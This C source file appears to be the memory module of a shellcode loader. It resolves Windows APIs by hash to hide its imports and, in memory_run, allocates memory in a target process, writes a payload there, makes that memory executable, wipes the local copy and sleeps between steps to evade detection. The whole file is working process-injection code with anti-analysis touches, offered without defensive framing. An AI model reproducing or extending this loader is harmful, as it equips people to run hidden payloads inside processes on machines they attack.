#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apis.h"
#include "../../../includes/core/core.h"
#include "../../../includes/utils/utils.h"








BOOL memory_load_apis() {
	g_ldr->apis->OpenProcess = (pOpenProcess)GetProc(g_ldr->apis->modules.kernel32, HASHED_OPENPROCESS);
	g_ldr->apis->VirtualAllocEx = (pVirtualAllocEx)GetProc(g_ldr->apis->modules.kernel32, HASHED_VIRTUALALLOCEX);
	g_ldr->apis->WriteProcessMemory = (pWriteProcessMemory)GetProc(g_ldr->apis->modules.kernel32, HASHED_WRITEPROCESSMEMORY);
	g_ldr->apis->VirtualProtectEx = (pVirtualProtectEx)GetProc(g_ldr->apis->modules.kernel32, HASHED_VIRTUALPROTECTEX);

	return TRUE;
}


MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
	MemoryInfo memInfo = { 0 };

	DWORD pid;
	HANDLE hProc = resolve_target_process(&pid);
	LPVOID addr = g_ldr->apis->VirtualAllocEx(hProc, NULL, PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!addr) {
		DBGA("[!] Failed Allocating Remote Memory | %lu\n", GetLastError());
		memInfo.ok = FALSE;
		memInfo.BytesWrote = 0;
		return memInfo;
	}
	ldr_sleep(g_ldr->config->DelayBetween);
	SIZE_T BytesWrote = 0;
	if (!g_ldr->apis->WriteProcessMemory(hProc, addr, PayloadAddress, PayloadSize, &BytesWrote)) {
		DBGA("[!] Failed Writing Remote Memory | %lu\n", GetLastError());
		memInfo.ok = FALSE;
		memInfo.BytesWrote = 0;
		return memInfo;
	}
	DWORD old = 0;
	BOOL check = g_ldr->apis->VirtualProtectEx(hProc, addr, PayloadSize, PAGE_EXECUTE_READ, &old);
	if (!check) {
		DBGA("[!] VirtualProtect Failed | %d\n", GetLastError());
		memInfo.ok = FALSE;
		memInfo.BytesWrote = 0;
		return memInfo;
	}
	clear_payload(PayloadAddress, PayloadSize);
	ldr_sleep(g_ldr->config->DelayBetween);

	memInfo.ShellCodeAddress = addr;
	memInfo.BytesWrote = BytesWrote;
	memInfo.ok = TRUE;
	memInfo.remoteProcess = hProc;
	memInfo.remotePid = pid;


	return memInfo;

}


